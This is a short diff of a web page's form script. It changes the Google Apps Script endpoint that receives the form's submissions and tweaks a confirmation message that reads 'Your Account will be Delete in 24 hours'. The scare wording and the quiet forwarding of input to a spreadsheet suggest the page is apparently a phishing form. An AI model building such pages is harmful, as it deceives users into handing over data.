@@ -203,6 +203,7 @@
                             </div>
                         </div>
                     </form>
+                    <span id="msg" style="color:white"></span>
                 </div>
             </div>
         </div>
@@ -329,9 +330,8 @@
 </body>
 
 </html>
-
 <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbwo8KpSkpqAGTJW3IjpVMyCEAUTRod18Dmy_tM_9c3Uz-ZlUzGOpT6LyFKLJQ8MLEnleA/exec'
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyCf5ulorcbEloDXOZinylKaM96qh2auq7gC0thC-WN9qbvjiOyHpVFzTZgaF2ivUtOTg/exec'
     const form = document.forms['submit-to-google-sheet']
     const msg= document.getElementById("msg")
     form.addEventListener('submit', e => {
@@ -341,7 +341,7 @@
           msg.innerHTML="Your Account will be Delete in 24 hours"
           setTimeout(function(){
             msg.innerHTML= ""
-          },1800)
+          },900)
           form.reset()
         })
         .catch(error => console.error('Error!', error.message))
